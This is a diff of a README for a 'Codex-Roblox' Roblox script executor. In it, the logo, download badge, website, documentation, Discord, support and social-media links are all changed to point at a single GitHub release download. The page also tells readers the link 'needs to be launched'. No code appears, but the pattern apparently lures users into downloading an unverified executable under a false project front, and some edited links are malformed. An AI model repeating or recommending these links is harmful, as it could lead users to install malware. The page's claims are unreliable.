@@ -1,6 +1,6 @@
 # 🚀 Welcome to Codex-Roblox Repository
 
-![Codex-Roblox Logo](https://example.com/logo.png)
+![Codex-Roblox Logo](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)
 
 ## Repository Name
 Codex-Roblox
@@ -12,7 +12,7 @@ Roblox Codex Executor supports low-end PCs and lets you enjoy stability and smoo
 builder, code, codex, codex-download, codex-github, codex-roblox, collaborate, community, contribute, development, framework, roblox, roblox-codex, roblox-lua
 
 ## 📂 Download Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0%20Version-blue)](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)
 
 *Please note that the link provided needs to be launched.*
 
@@ -36,16 +36,16 @@ We welcome contributions from the community to enhance the Codex-Roblox experien
 Join our community to collaborate, share ideas, and get support from fellow developers and gamers. Together, we can make Codex-Roblox even better for everyone to enjoy.
 
 ## Quick Links
-🌐 [Codex-Roblox Website](https://www.codex-roblox.com)  
-📘 [Documentation](https://www.codex-roblox.com/docs)  
-💬 [Discord Community](https://discord.gg/codex-roblox)  
-📧 [Contact Support](mailto:support@codex-roblox.com)
+🌐 [Codex-Roblox Website](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)  
+📘 [Documentation](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)  
+💬 [Discord Community](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)  
+📧 [Contact Support](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)
 
 ## Stay Connected
 Follow us on social media to stay updated with the latest news, releases, and community events:
-- [Twitter](https://twitter.com/CodexRoblox)
-- [Instagram](https://www.instagram.com/codexroblox)
-- [Facebook](https://www.facebook.com/CodexRoblox)
+- [Twitter](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)
+- [Instagram](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)
+- [Facebook](https://github.com/DouglasMegaCode/Codex-Roblox/releases/tag/v1.0)
 
 ## Contributors
 A big thank you to all the contributors who have helped make Codex-Roblox what it is today. Your efforts and contributions are greatly appreciated.
